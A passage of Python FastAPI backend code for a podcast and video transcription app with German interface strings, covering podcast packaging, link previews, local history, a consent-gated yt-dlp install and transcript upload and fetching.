                                files.append(txt.name)
                                md = folder / f"{slug}_Transkript.md"
                                md.write_text(episode_transcript_md(ep, segs, "Official transcript from the show"),
                                              encoding="utf-8")
                                files.append(md.name)
                        except Exception:
                            pass

            if want_audio != "nein" and ep.get("audio"):
                rec["stage"] = f"{i}/{len(episodes)} · Ton wird geladen…"
                ext = (ep.get("audio", "").split("?")[0].rsplit(".", 1) + ["mp3"])[1][:4]
                raw = folder / f"_roh.{ext}"
                if await _fetch_to_file(ep["audio"], raw):
                    if want_audio == "klein":
                        rec["stage"] = f"{i}/{len(episodes)} · Ton wird verkleinert…"
                        small = folder / f"{slug}.mp3"
                        if await _shrink_audio(raw, small, ep.get("duration_s", 0)):
                            raw.unlink(missing_ok=True)
                            files.append(small.name)
                        else:
                            raw.rename(folder / f"{slug}.{ext}")
                            files.append(f"{slug}.{ext}")
                    else:
                        raw.rename(folder / f"{slug}.{ext}")
                        files.append(f"{slug}.{ext}")

            # Desktop only: finish the job instead of handing over a script.
            # Needs the audio, so it runs after the download, and only where
            # the feed offered no transcript of its own.
            if not ep.get("transcripts"):
                rec["stage"] = f"{i}/{len(episodes)} · {ep.get('title', '')[:40]}"
                await _podcast_transcribe_local(rec, ep, folder, slug, files)

            ep["files"] = files
            rec["done"] = i

        (out / "manifest.json").write_text(
            json.dumps(podcast.build_manifest(episodes, {"audio": want_audio}),
                       ensure_ascii=False, indent=2), encoding="utf-8")

        mac = build_podcast_whisper_script(episodes, "mac")
        if mac:
            (out / "whisper_mac.command").write_text(mac, encoding="utf-8")
            os.chmod(out / "whisper_mac.command", 0o755)
            (out / "whisper_windows.ps1").write_text(
                build_podcast_whisper_script(episodes, "windows"), encoding="utf-8")

        done_locally = sum(1 for e in episodes if e.get("transcript_source"))
        missing = sum(1 for e in episodes if e.get("status") != "nicht_aufgeloest"
                      and not e.get("transcripts") and not e.get("transcript_source"))
        (out / "LIESMICH.txt").write_text(
            "\n".join([
                "Podcast-Paket",
                "=" * 13, "",
                f"{sum(1 for e in episodes if e.get('status') == 'ok')} von {len(episodes)} "
                "Folgen sauber aufgelöst.",
                f"{sum(1 for e in episodes if e.get('transcripts'))} mit offiziellem "
                "Transkript aus dem Feed.",
                *([f"{done_locally} hier auf diesem Rechner transkribiert."]
                  if done_locally else []),
                "",
                *([] if not missing else [
                    f"Für die übrigen {missing} liegt ein Script bei:",
                    "  macOS:   whisper_mac.command doppelklicken",
                    "  Windows: whisper_windows.ps1 in PowerShell ausführen",
                    "",
                    "Es wählt das Modell nach Maschine und sagt, was es gewählt hat.",
                    "Folgen über 45 Minuten werden gestückelt — das ist Absicht, bei",
                    "wenig Arbeitsspeicher brechen lange Läufe sonst mitten ab.",
                    "",
                ]),
                "Zeitmarken in den .zeitmarken.txt beziehen sich auf die Aufnahme.",
                "Whisper verhört Eigennamen — bei Zitaten gegen den Ton prüfen.",
                "",
                "Shownotes sind für Recherche oft das Wertvollste: viele Sendungen",
                "verlinken dort ihre Belege.",
            ]) + "\n", encoding="utf-8")

        rec.update(status="done", stage="", episodes=episodes)
    except Exception as e:
        rec.update(status="error", stage="", error=str(e)[:300])
        log_error("podcast", str(e)[:300])


# ── Link preview ─────────────────────────────────────────────────────────────
# Title and author for a pasted link, so a list of twenty URLs is readable
# before anything is fetched. oEmbed where a platform offers it, the page's
# Open Graph tags otherwise — both through podcast.fetch, which refuses
# private addresses and follows redirects by hand. No thumbnails: an image
# from the platform would hand the viewer's address to it on every paste.
_PREVIEW_CACHE: dict[str, tuple[float, dict]] = {}
_OEMBED = {
    ("youtube.com", "youtu.be"): "https://www.youtube.com/oembed?format=json&url=",
    ("tiktok.com",): "https://www.tiktok.com/oembed?url=",
    ("open.spotify.com",): "https://open.spotify.com/oembed?url=",
    ("vimeo.com",): "https://vimeo.com/api/oembed.json?url=",
    ("soundcloud.com",): "https://soundcloud.com/oembed?format=json&url=",
}


def _head_meta(raw: bytes) -> dict:
    """og:title, og:site_name, author and <title> from the start of a page.

    A real parser, not regular expressions: patterns with two unbounded
    `[^>]+` around a literal take quadratic time on a page of `<meta `
    repeated, and an attacker controls the page. Only the first 256 KB, and
    the parse stops at </head>.
    """
    from html.parser import HTMLParser

    class P(HTMLParser):
        def __init__(self):
            super().__init__(convert_charrefs=True)
            self.found: dict = {}
            self._in_title = False
            self.done = False

        def handle_starttag(self, tag, attrs):
            if self.done:
                return
            if tag == "meta":
                a = {k.lower(): (v or "") for k, v in attrs}
                key = (a.get("property") or a.get("name") or "").lower()
                if key in ("og:title", "og:site_name", "author") and key not in self.found:
                    self.found[key] = a.get("content", "").strip()[:300]
            elif tag == "title":
                self._in_title = True

        def handle_endtag(self, tag):
            if tag == "title":
                self._in_title = False
            elif tag == "head":
                self.done = True

        def handle_data(self, data):
            if self._in_title and "<title>" not in self.found:
                self.found["<title>"] = data.strip()[:300]

    p = P()
    try:
        p.feed(raw[:262_144].decode("utf-8", "replace"))
    except Exception:
        pass
    return p.found


async def link_preview(url: str) -> dict:
    import json as _json
    from urllib.parse import quote
    hit = _PREVIEW_CACHE.get(url)
    if hit and time.time() - hit[0] < 600:
        return hit[1]
    out = {"url": url, "title": "", "author": "", "site": _platform_of(url)}
    for hosts, endpoint in _OEMBED.items():
        if _host_is(url, *hosts):
            try:
                raw = await podcast.fetch(endpoint + quote(url, safe=""), timeout=8,
                                          max_bytes=200_000)
                d = _json.loads(raw) if raw else {}
                out.update(title=d.get("title", "") or "", author=d.get("author_name", "") or "",
                           site=d.get("provider_name", "") or out["site"])
            except Exception:
                pass
            break
    if not out["title"]:
        try:
            raw = await podcast.fetch(url, timeout=8, max_bytes=1_000_000)
            if raw:
                found = await asyncio.to_thread(_head_meta, raw)
                out.update(title=found.get("og:title") or found.get("<title>", ""),
                           site=found.get("og:site_name") or out["site"],
                           author=out["author"] or found.get("author", ""))
        except Exception:
            pass
    out["title"] = out["title"][:300]
    out["author"] = out["author"][:120]
    if len(_PREVIEW_CACHE) > 500:
        _PREVIEW_CACHE.clear()
    _PREVIEW_CACHE[url] = (time.time(), out)
    return out


@app.get("/api/preview")
async def preview(url: str, user: dict = Depends(current_user)):
    url = require_http_url(url)
    try:
        return await asyncio.wait_for(link_preview(url), timeout=12)
    except asyncio.TimeoutError:
        return {"url": url, "title": "", "author": "", "site": _platform_of(url)}


# ── History (desktop only) ────────────────────────────────────────────────────
# A server keeps no record of what anyone fetched, and the interface says so.
# The desktop app is different: the only person whose history it is sits in
# front of it, and "what was that episode last week" is a fair thing to ask.
# Private mode switches recording off; entries can be deleted one by one or
# all at once. Nothing here leaves the Mac.

def _history_on() -> bool:
    return DESKTOP_MODE and db.get_setting("private_mode", "0") != "1"


def _job_title(jid: str) -> str:
    j = jobs.get(jid) or {}
    return ((j.get("meta") or {}).get("title") or j.get("filename") or "")[:500]


async def _remembered(work, entries):
    """Run a job, then record what it produced — after, not before, so the
    history only lists things that actually arrived."""
    try:
        await work
    finally:
        if _history_on():
            try:
                for e in entries():
                    if e and e[1]:
                        db.add_history(*e)
            except Exception as ex:          # history must never fail a job
                log_error("Verlauf", str(ex)[:200])


def _require_desktop(request: Request):
    if not _desktop_request(request):
        raise HTTPException(404, "Nur in der Mac-App.")


@app.get("/api/history")
async def history_list(request: Request, user: dict = Depends(current_user)):
    _require_desktop(request)
    return {"private": db.get_setting("private_mode", "0") == "1",
            "items": db.list_history()}


@app.delete("/api/history/{hid}")
async def history_delete(hid: int, request: Request, user: dict = Depends(current_user)):
    _require_desktop(request)
    return {"deleted": db.delete_history(hid)}


@app.delete("/api/history")
async def history_clear(request: Request, user: dict = Depends(current_user)):
    _require_desktop(request)
    return {"deleted": db.clear_history()}


@app.post("/api/history/private")
async def history_private(request: Request, on: bool = Form(...),
                          user: dict = Depends(current_user)):
    _require_desktop(request)
    db.set_setting("private_mode", "1" if on else "0")
    return {"private": on}


@app.get("/api/history/new-episodes")
async def history_new_episodes(request: Request, user: dict = Depends(current_user)):
    """For every feed in the history: episodes that are not in it yet.
    Reads the feeds now; stores nothing new."""
    _require_desktop(request)
    out = []
    for f in db.history_feeds()[:30]:
        try:
            raw = await podcast.fetch(f["feed"], timeout=20)
            parsed = podcast.parse_feed(raw) if raw else {}
        except Exception:
            parsed = {}
        if not parsed:
            out.append({"feed": f["feed"], "show": f["show"], "error": "Feed nicht abrufbar.",
                        "episodes": []})
            continue
        seen = set(f["guids"])
        fresh = [e for e in parsed["episodes"] if e.get("guid") and e["guid"] not in seen]
        # Only what came after the newest fetched episode, not the whole back
        # catalogue of a show someone tried once.
        newest = max((podcast.parse_date(e["date"]) for e in parsed["episodes"]
                      if e.get("guid") in seen and podcast.parse_date(e["date"])), default=None)
        if newest:
            fresh = [e for e in fresh
                     if (podcast.parse_date(e["date"]) or newest) > newest]
        out.append({"feed": f["feed"],
                    "show": parsed["show"].get("title") or f["show"],
                    "episodes": [{"title": e["title"], "date": e["date"], "guid": e["guid"]}
                                 for e in fresh[:20]]})
    return {"feeds": out}


# ── Media opt-in (desktop only) ───────────────────────────────────────────────
# Since 1.1.0 the Mac app installs no extractor on its own. Fundus downloads
# no media itself; on request it installs the open-source yt-dlp from PyPI
# into its own environment, and only after the person has ticked a consent
# box. YouTube media and the MCP download helpers are separate switches with
# their own acknowledgement. Servers are unaffected: there the operator's
# environment variables decide, as before.

_media_install: dict = {"status": "idle", "detail": "", "at": None}


def _extractor_version() -> str:
    from importlib import metadata
    try:
        return metadata.version("yt-dlp")
    except Exception:
        return ""


def _extractor_installed() -> bool:
    import shutil
    return bool(_extractor_version() or shutil.which("yt-dlp"))


def _media_status() -> dict:
    import mcp_tools
    return {
        "extractor_installed": _extractor_installed(),
        "extractor_version": _extractor_version(),
        "youtube_video_enabled": youtube_video_enabled(),
        "media_tools_enabled": mcp_tools.media_tools_enabled(),
        "consent_at": db.get_setting("media_consent_at", "") or None,
        "install": dict(_media_install),
    }


async def _media_install_job():
    """pip into this interpreter's own environment — never a bare `pip`."""
    import sys
    import shutil
    req = str(Path(__file__).resolve().parent / "requirements-extractors.txt")
    pip = [sys.executable, "-m", "pip", "install", "--no-cache-dir", "--upgrade"]
    steps = [pip + ["-r", req], pip + ["--pre", "yt-dlp[default]"]]
    # Deno only yt-dlp needs (YouTube's JS challenge), so it comes with it.
    if not shutil.which("deno") and not (Path(sys.executable).parent / "deno").exists():
        steps.append(pip + ["deno"])
    failure = ""
    try:
        for cmd in steps:
            code, _, err = await run_cmd(cmd)
            if code != 0:
                tail = (err or "").strip().splitlines()
                failure = tail[-1][:200] if tail else f"pip endete mit {code}"
                break
        if not failure:
            await _read_ytdlp_version()
            _components.clear()
    except Exception as e:
        failure = str(e)[:200]
    _media_install.update(status="error" if failure else "done", detail=failure,
                          at=datetime.now().isoformat(timespec="seconds"))
    if failure:
        log_error("media-install", failure)


@app.get("/api/media/status")
async def media_status(request: Request, user: dict = Depends(current_user)):
    _require_desktop(request)
    return _localized(request, _media_status())


@app.post("/api/media/install")
async def media_install(request: Request, background_tasks: BackgroundTasks,
                        consent: bool = Form(False),
                        user: dict = Depends(current_user)):
    _require_desktop(request)
    if not consent:
        raise HTTPException(400, "Ohne Einwilligung wird nichts installiert.")
    if _media_install["status"] == "running":
        raise HTTPException(409, "Die Installation läuft bereits.")
    db.set_setting("media_consent_at", datetime.now().isoformat(timespec="seconds"))
    _media_install.update(status="running", detail="", at=None)
    background_tasks.add_task(_media_install_job)
    return _localized(request, _media_status())


@app.post("/api/media/settings")
async def media_settings(request: Request,
                         youtube_video: bool | None = Form(None),
                         media_tools: bool | None = Form(None),
                         consent: bool = Form(False),
                         user: dict = Depends(current_user)):
    """Switch YouTube media and the MCP download helpers. Switching either ON
    needs consent=true — a separate acknowledgement from the install consent.
    Switching off never needs anything."""
    _require_desktop(request)
    if youtube_video:
        if not _extractor_installed():
            raise HTTPException(409, "Zuerst yt-dlp installieren.")
        if not db.get_setting("media_consent_at", ""):
            raise HTTPException(409, "Zuerst der Installation zustimmen.")
        if not consent:
            raise HTTPException(400, "Bitte den Hinweis bestätigen.")
    if media_tools and not consent:
        raise HTTPException(400, "Bitte den Hinweis bestätigen.")
    now = datetime.now().isoformat(timespec="seconds")
    if youtube_video is not None:
        db.set_setting("youtube_video", "1" if youtube_video else "0")
        if youtube_video:
            db.set_setting("youtube_video_consent_at", now)
    if media_tools is not None:
        db.set_setting("media_tools", "1" if media_tools else "0")
        if media_tools:
            db.set_setting("media_tools_consent_at", now)
    return _localized(request, _media_status())


@app.post("/api/podcast")
async def podcast_start(background_tasks: BackgroundTasks,
                        urls: str = Form(""), sheet: str = Form(""),
                        audio: str = Form("klein"),
                        user: dict = Depends(current_user)):
    raw_sheet = sheet or urls
    items = podcast.parse_order_sheet(raw_sheet)
    # Ein früheres manifest.json lässt sich unverändert einwerfen: dort steht
    # bei jeder Folge schon Sendung und Feed, dazu eine ausdrückliche
    # feeds-Tabelle. Damit entfällt die Apple-Suche — die Stufe, die am Namen
    # hängt und am häufigsten daneben greift.
    feed_hints = podcast.order_sheet_feeds(raw_sheet)
    if not items:
        raise HTTPException(400, "Keine Folgen erkannt. Links einfügen oder "
                                 "Auftragszettel im Format fundus-podcast/1.")
    if len(items) > PODCAST_MAX_EPISODES:
        raise HTTPException(400, f"{len(items)} Folgen — höchstens "
                                 f"{PODCAST_MAX_EPISODES} auf einmal.")
    if audio not in ("klein", "original", "nein"):
        raise HTTPException(400, "Unbekannte Ton-Einstellung.")
    # Every episode is an audio download (and maybe a Whisper run), so each
    # one counts against the hourly budget like a URL in a batch does.
    _batch_throttle(user["id"], len(items))

    pid = str(uuid.uuid4())
    podcasts[pid] = {"status": "pending", "stage": "Wird vorbereitet…",
                     "user_id": user["id"], "total": len(items), "done": 0,
                     "feeds": feed_hints,
                     "created": datetime.now().isoformat()}
    db.log_event(user["id"], "podcast")
    background_tasks.add_task(
        _remembered, _podcast_job(pid, items, audio),
        lambda: [("podcast", ep.get("link") or ep.get("source") or ep.get("audio", ""),
                  ep.get("title", ""), ep.get("show", ""), ep.get("feed", ""),
                  ep.get("guid", ""), ep.get("date", ""))
                 for ep in (podcasts.get(pid, {}).get("episodes") or [])
                 if ep.get("status") in ("ok", "unsicher")])
    return {"podcast_id": pid, "count": len(items)}


def _own_podcast(pid: str, user: dict) -> dict:
    rec = podcasts.get(pid)
    if not rec or rec.get("user_id") != user["id"]:
        raise HTTPException(404, "Nicht gefunden.")
    return rec


@app.get("/api/podcast/{pid}")
async def podcast_status(pid: str, request: Request, user: dict = Depends(current_user)):
    rec = _own_podcast(pid, user)
    out = {k: v for k, v in rec.items() if k != "user_id"}
    # The slug is what the upload route keys on; computing it here keeps the
    # browser from having to reimplement episode_slug and drift from it.
    if rec.get("episodes"):
        out["episodes"] = [{**ep, "slug": podcast.episode_slug(ep)}
                           if ep.get("status") != "nicht_aufgeloest" else ep
                           for ep in rec["episodes"]]
    return _localized(request, out)


@app.get("/api/podcast/{pid}/search")
async def podcast_search(pid: str, q: str = "", limit: int = 40,
                         user: dict = Depends(current_user)):
    """In welcher Folge wurde über X gesprochen — und ab wann.

    `_own_podcast` prüft zuerst das Eigentum: ohne das wäre dies ein Weg,
    die Transkripte fremder Läufe zu durchsuchen.
    """
    rec = _own_podcast(pid, user)
    folder = _podcast_dir(pid)
    if not folder.exists():
        raise HTTPException(404, "Paket nicht mehr vorhanden.")
    hits = await asyncio.to_thread(
        search_transcripts, folder, q, max(1, min(int(limit or 40), 200)),
        rec.get("episodes"))
    # Den Folgentitel aus dem Manifest nachschlagen: der Ordnername ist ein
    # Slug und als Antwort auf „welche Folge?" zu wenig.
    titles = {}
    for ep in (rec.get("episodes") or []):
        if ep.get("title"):
            titles[podcast.episode_slug(ep)] = ep["title"]
    for h in hits:
        h["title"] = titles.get(h["episode"], h["episode"])
    return {"query": q, "count": len(hits), "hits": hits}


@app.get("/api/podcast/{pid}/zip")
async def podcast_zip(pid: str, user: dict = Depends(current_user)):
    rec = _own_podcast(pid, user)
    if rec.get("status") != "done":
        raise HTTPException(409, "Noch nicht fertig.")
    folder = _podcast_dir(pid)
    if not folder.exists():
        raise HTTPException(404, "Paket nicht mehr vorhanden.")
    import shutil
    archive = DOWNLOAD_DIR / f"podcast_{pid}.zip"
    if not archive.exists():
        await asyncio.to_thread(
            shutil.make_archive, str(archive.with_suffix("")), "zip", str(folder))
    zname = f"podcasts_{datetime.now():%Y-%m-%d}.zip"
    return FileResponse(archive, media_type="application/zip", filename=zname,
                        headers={"Content-Disposition": content_disposition(zname)})


@app.get("/api/podcast/{pid}/script.{kind}")
async def podcast_script(pid: str, kind: str, user: dict = Depends(current_user)):
    """The Whisper script on its own, for people who already have the audio."""
    rec = _own_podcast(pid, user)
    if kind not in ("mac", "windows"):
        raise HTTPException(400, "Unbekanntes System.")
    script = build_podcast_whisper_script(rec.get("episodes", []), kind)
    if not script:
        raise HTTPException(404, "Alle Folgen haben ein offizielles Transkript.")
    return PlainTextResponse(script)


PODCAST_TRANSCRIPT_MAX_BYTES = 5 * 1024 * 1024


def _srt_to_vtt(body: str) -> str:
    """SRT and VTT differ in the header and the decimal separator, nothing else
    that matters here. Converting means search gets time marks from either."""
    body = body.lstrip("\ufeff")
    body = re.sub(r"(\d\d:\d\d:\d\d),(\d{3})", r"\1.\2", body)
    return "WEBVTT\n\n" + body


@app.post("/api/podcast/{pid}/transcript/{slug}")
async def podcast_transcript_upload(pid: str, slug: str, file: UploadFile = File(...),
                                    user: dict = Depends(current_user)):
    """Bring the Whisper script's output back into the package.

    The script runs on the person's machine, so its results never reached the
    server, and the package search only ever saw the feed transcripts. Stored
    under the same names the server path writes, so search, ZIP and manifest
    treat both alike.

    The slug has to be one this package produced. That check is the path
    guard as well: a name from the request never becomes a directory on its
    own, only a lookup into the known set.
    """
    rec = _own_podcast(pid, user)
    if rec.get("status") != "done":
        # The package job still writes into these folders and builds the ZIP.
        raise HTTPException(409, "Das Paket wird noch gebaut.")
    known = {podcast.episode_slug(ep): ep for ep in (rec.get("episodes") or [])
             if ep.get("status") != "nicht_aufgeloest"}
    ep = known.get(slug)
    if ep is None:
        raise HTTPException(404, "Diese Folge gehört nicht zum Paket.")
    folder = _podcast_dir(pid) / slug
    if not folder.is_dir():
        raise HTTPException(404, "Paket nicht mehr vorhanden.")

    ext = Path(file.filename or "").suffix.lower().lstrip(".")
    if ext not in ("vtt", "srt", "txt"):
        raise HTTPException(400, "Nur .vtt, .srt oder .txt.")
    raw = await file.read(PODCAST_TRANSCRIPT_MAX_BYTES + 1)
    if len(raw) > PODCAST_TRANSCRIPT_MAX_BYTES:
        raise HTTPException(413, "Größer als 5 MB, das ist kein Transkript.")
    body = raw.decode("utf-8", errors="replace").lstrip("\ufeff")

    # Parse and build everything first, touch the folder afterwards. The old
    # order deleted the existing transcript and then found the upload had no
    # time marks — a wrong file picked in the dialog cost the transcript that
    # was already there.
    if ext in ("vtt", "srt"):
        vtt = body if ext == "vtt" else _srt_to_vtt(body)
        segs = vtt_to_segments(vtt)
        if not segs:
            raise HTTPException(400, "Keine Zeitmarken gefunden.")
        # Normalised output, not the upload itself: what lands in the package
        # is what this app can parse again, in all four forms.
        outputs = [("vtt", segments_to_vtt(segs)), ("srt", segments_to_srt(segs)),
                   ("txt", segments_to_text(segs)),
                   ("zeitmarken.txt", segments_to_timestamped(segs)),
                   ("md", episode_transcript_md(ep, segs, "Whisper script, local"))]
    else:
        if not body.strip():
            raise HTTPException(400, "Die Datei ist leer.")
        outputs = [("txt", body)]

    # Earlier transcript files go before writing: a fresh .txt next to an old
    # .vtt would leave search reading the old one, because it prefers time
    # marks.
    for old_file in folder.glob(f"{slug}_Transkript.*"):
        old_file.unlink(missing_ok=True)
    written = []
    for suffix, text in outputs:
        (folder / f"{slug}_Transkript.{suffix}").write_text(text, encoding="utf-8")
        written.append(f"{slug}_Transkript.{suffix}")

    files = [f for f in ep.get("files", []) if not f.startswith(f"{slug}_Transkript.")]
    files.extend(written)
    ep["files"] = files
    ep["transcript_source"] = "whisper-script"
    # The manifest is what the ZIP and the MCP file reader hand out.
    try:
        man = _podcast_dir(pid) / "manifest.json"
        if man.exists():
            import json as _json
            data = _json.loads(man.read_text(encoding="utf-8"))
            for e in data.get("episodes", []):
                if e.get("slug") == slug or podcast.episode_slug(e) == slug:
                    e["files"] = files
                    e["transcript_source"] = "whisper-script"
            man.write_text(_json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")
    except Exception as e:
        log_error("podcast-upload-manifest", str(e)[:200])
    # A ZIP built before this upload would hand out the package without it.
    (DOWNLOAD_DIR / f"podcast_{pid}.zip").unlink(missing_ok=True)
    return {"slug": slug, "files": written}


# ── Transcript ────────────────────────────────────────────────────────────────

@app.post("/api/transcript")
async def transcript(
    background_tasks: BackgroundTasks,
    url: str = Form(...),
    lang: str = Form("native"),
    prompt: str = Form(""),
    user: dict = Depends(current_user),
):
    # Dieser Endpunkt prüfte die URL gar nicht, obwohl sie als Argument an
    # yt-dlp geht — siehe require_http_url.
    url = require_http_url(url)
    # A transcript can fall back to downloading audio and running Whisper —
    # the most expensive thing this server does. Counted like a batch URL.
    _batch_throttle(user["id"], 1)
    job_id = str(uuid.uuid4())
    jobs[job_id] = {"status": "pending", "url": url, "type": "transcript",
                    "user_id": user["id"], "created": datetime.now().isoformat()}
    db.log_event(user["id"], "transcript")
    # The glossary only matters if the Whisper fallback runs; subtitles from
    # the platform are taken as they are.
    background_tasks.add_task(
        _remembered, _transcript_job(job_id, url, lang, user["id"],
                                     prompt=_clean_glossary(prompt)),
        lambda: [("transcript", url, _job_title(job_id))]
        if jobs.get(job_id, {}).get("status") == "done" else [])
    return {"job_id": job_id}


@app.post("/api/transcript/upload")
async def transcript_upload(
    background_tasks: BackgroundTasks,
    file: UploadFile = File(...),
    lang: str = Form("native"),
    prompt: str = Form(""),
    user: dict = Depends(current_user),
):
    """Transcribe a file the person already has: an interview recording, a
    voice memo, a clip from a platform this app cannot reach.

    Same job shape as /api/transcript, so the existing polling, rendering and
    export work unchanged. The upload is deleted when the job ends, whatever
    the outcome: this is a transcription service, not storage.
    """
    if not WHISPER_ENABLED:
        raise HTTPException(503, "Lokale Transkription ist auf dieser Instanz "
                                 "abgeschaltet (WHISPER_ENABLED=0).")
    # Two open uploads per person: each one is a file on disk and a place in
    # the transcription queue.
    open_uploads = sum(1 for j in jobs.values()
                       if j.get("upload") and j.get("user_id") == user["id"]
                       and j.get("status") in ("pending", "running"))
    if open_uploads >= 2:
        raise HTTPException(429, "Es laufen schon zwei Dateien. Bitte warten, bis eine fertig ist.")
    name = Path(file.filename or "").name
    ext = Path(name).suffix.lower().lstrip(".")
    if ext not in UPLOAD_EXTENSIONS:
        raise HTTPException(400, "Dateityp nicht unterstützt. Erlaubt: "
                                 + ", ".join(sorted(UPLOAD_EXTENSIONS)))

    # The declared size is checked in the _gate middleware, before the
    # multipart parser spools anything; this loop counts what actually came.
    limit = UPLOAD_MAX_MB * 1024 * 1024
    job_id = str(uuid.uuid4())
    TMP_DIR.mkdir(parents=True, exist_ok=True)
    # The stored name is ours, never the client's: the filename is only used
    # for its extension and as a display title.
    dest = TMP_DIR / f"{job_id}_upload.{ext}"
    size = 0
    try:
        with dest.open("wb") as fh:
            while chunk := await file.read(1024 * 1024):
                size += len(chunk)
                if size > limit:
                    raise HTTPException(413, f"Datei größer als {UPLOAD_MAX_MB} MB.")
                fh.write(chunk)
        dur = await _media_duration(dest)
        if not dur:
            raise HTTPException(400, "Die Datei enthält keinen lesbaren Ton.")
        if dur > WHISPER_MAX_MINUTES * 60:
            raise HTTPException(413, f"{int(dur // 60)} Minuten, höchstens "
                                     f"{WHISPER_MAX_MINUTES} auf dieser Instanz.")
    except BaseException:
        dest.unlink(missing_ok=True)
        raise

    jobs[job_id] = {"status": "pending", "url": "", "type": "transcript", "upload": True,
                    "user_id": user["id"], "created": datetime.now().isoformat(),
                    "progress": 5, "stage": "Datei wird vorbereitet…"}
    try:
        db.log_event(user["id"], "transcript")
    except Exception:
        pass        # statistics must not leave a 500 MB file behind
    background_tasks.add_task(_upload_transcript_job, job_id, dest, lang,
                              _clean_glossary(prompt), Path(name).stem, dur)
    return {"job_id": job_id}


async def _upload_transcript_job(job_id: str, path: Path, lang: str, prompt: str,
                                 title: str, dur: float):
    try:
        jobs[job_id]["status"] = "running"
        mins = max(1, int((dur or 0) // 60))
        _stage(job_id, 15, "Ton wird vorbereitet…")
        wav = await _normalise_upload(path)
        if wav is None:
            jobs[job_id].update({"status": "error", "progress": 100, "stage": "",
                                 "error": "Die Datei ließ sich nicht lesen."})
            return
        path.unlink(missing_ok=True)
        path = wav
        _stage(job_id, 30, f"Ton wird transkribiert (~{mins} Min Material)…")
        segments, used = await _whisper_segments(path, lang, prompt=prompt,
                                                 timeout=WHISPER_TIMEOUT)
        if not segments:
            jobs[job_id].update({"status": "error", "progress": 100, "stage": "",
                                 "error": "Kein gesprochener Text erkannt."})
            return
        meta = {"title": title or "Transkript", "uploader": "", "upload_date": "",
                "webpage_url": "", "chapters": [], "extractor": "Datei",
                "via_whisper": True}
        _finish_transcript(job_id, segments, used or lang, meta, False)
    except asyncio.TimeoutError:
        jobs[job_id].update({"status": "error", "progress": 100, "stage": "",
                             "error": f"Abgebrochen nach {WHISPER_TIMEOUT} Sekunden."})
    except Exception as e:
        log_error("upload-whisper", str(e)[:300])
        jobs[job_id].update({"status": "error", "progress": 100, "stage": "",
                             "error": "Transkription fehlgeschlagen."})
    finally:
        path.unlink(missing_ok=True)
        path.with_name(path.stem + "_norm.wav").unlink(missing_ok=True)


async def _yt_oembed(url: str) -> dict:
    """Title and channel via YouTube's oEmbed endpoint — one tiny request, no
    player API, no bot check. Milliseconds instead of a full yt-dlp extraction."""
    import json as _json
    from urllib.parse import quote

    def _get():
        from curl_cffi import requests as creq
        r = creq.get("https://www.youtube.com/oembed?format=json&url=" + quote(url, safe=""),
                     impersonate="chrome", timeout=12)
        return r.text if r.status_code == 200 else ""

    try:
        raw = await asyncio.to_thread(_get)
        d = _json.loads(raw) if raw else {}
        if d.get("title"):
            return {"title": d.get("title", ""), "uploader": d.get("author_name", ""),
                    "webpage_url": url, "upload_date": "", "language": "", "chapters": []}
    except Exception:
        pass
    return {}


async def _fetch_light_meta(url: str, cookies: str = "") -> dict:
    """Title/uploader/date/language/chapters for headers, without downloading media."""
    import json as _json
    ck = None
    if cookies and cookies.strip():
        ck = TMP_DIR / f"meta_{uuid.uuid4().hex}.txt"
        ck.write_text(cookies.strip())
    base = (["--cookies", str(ck)] if ck else []) + [
        "--skip-download", "--no-playlist",
        *_yt_extractor_args(bool(ck)),
        "--print", "%(title)s\n%(uploader)s\n%(upload_date)s\n%(webpage_url)s\n%(language)s\n%(chapters)j",
        "--", url,
    ]
    code, out, err = await run_ytdlp(base)
    if not (out or "").strip() and private_ext:
        again = await private_ext.retry_ytdlp(run_ytdlp, base, err,
                                              lambda o: bool((o or "").strip()))
        if again:
            code, out, err, _ = again
    if ck and ck.exists():
        ck.unlink()
    # yt-dlp prints "NA" for every field it does not know. Left in, that
    # became an uploader called "NA" and, worse, the language "NA", which
    # Whisper refuses outright: the transcript failed for exactly the
    # subtitle-less videos the Whisper fallback exists for.
    lines = [("" if l.strip() in ("NA", "None") else l)
             for l in (out or "").strip().splitlines()]
    lines += [""] * (6 - len(lines))
    lang = lines[4].strip()
    chapters = []
    try:
        raw = _json.loads(lines[5]) if lines[5] and lines[5] != "NA" else None
        if isinstance(raw, list):
            chapters = [{"start": c.get("start_time"), "title": c.get("title")} for c in raw]
    except Exception:
        pass
    return {
        "title": lines[0], "uploader": lines[1], "upload_date": lines[2],
        "webpage_url": lines[3] or url,
        "language": lang if lang and lang.lower() != "none" else "",
        "chapters": chapters,
    }


# ── Transcript time budget ────────────────────────────────────────────────────
# Hard ceiling for a transcript request. Without it a blocked platform can keep
# the UI spinning for minutes while every fallback is ground through.
TRANSCRIPT_TIMEOUT = int(os.environ.get("TRANSCRIPT_TIMEOUT", "75"))
# Whisper is a different kind of wait: it is not a stuck request, it is real
# work, and progress is visible. Measured on 4 vCPU with base/int8, VAD and
# beam 1: roughly a tenth of the runtime, so ten minutes of video take about
# one. The ceiling stays generous rather than tight — cancelling here throws
# away the audio download too.
WHISPER_TIMEOUT = int(os.environ.get("WHISPER_TIMEOUT", "600"))

def _fetch_transcript_sync(vid: str, prefer_lang: str, proxy: str = "",
                           translate: bool = False) -> tuple[list[dict], str]:
    """Blocking transcript fetch, optionally through an HTTP proxy. Raises on
    failure. A short socket timeout keeps a dead route from hanging the job.

    translate=True asks YouTube to machine-translate an existing track into the
    requested language. Worth a try only after the direct lookup failed: a real
    track always beats a translated one.
    """
    import socket
    socket.setdefaulttimeout(12)
    from youtube_transcript_api import YouTubeTranscriptApi
    kwargs = {}
    if proxy:
        from youtube_transcript_api.proxies import GenericProxyConfig
        kwargs["proxy_config"] = GenericProxyConfig(http_url=proxy, https_url=proxy)
    listing = YouTubeTranscriptApi(**kwargs).list(vid)
    codes = [t.language_code for t in listing]
    wanted = [c for c in (prefer_lang, f"{prefer_lang}-orig", "en", "de") if c] + codes

    if translate and prefer_lang and prefer_lang not in codes:
        # Pick any translatable track and let YouTube render the target language.
        for t in listing:
            if not getattr(t, "is_translatable", False):
                continue
            available = {l["language_code"] for l in (t.translation_languages or [])}
            if prefer_lang not in available:
                continue
            fetched = t.translate(prefer_lang).fetch()
            segs = [{"start": float(s.start), "dur": float(s.duration),
                     "text": re.sub(r"\s+", " ", s.text).strip()}
                    for s in fetched if (s.text or "").strip()]
            if segs:
                return segs, prefer_lang
        return [], ""

    tr = listing.find_transcript(wanted)
    segs = [{"start": float(s.start), "dur": float(s.duration),
             "text": re.sub(r"\s+", " ", s.text).strip()}
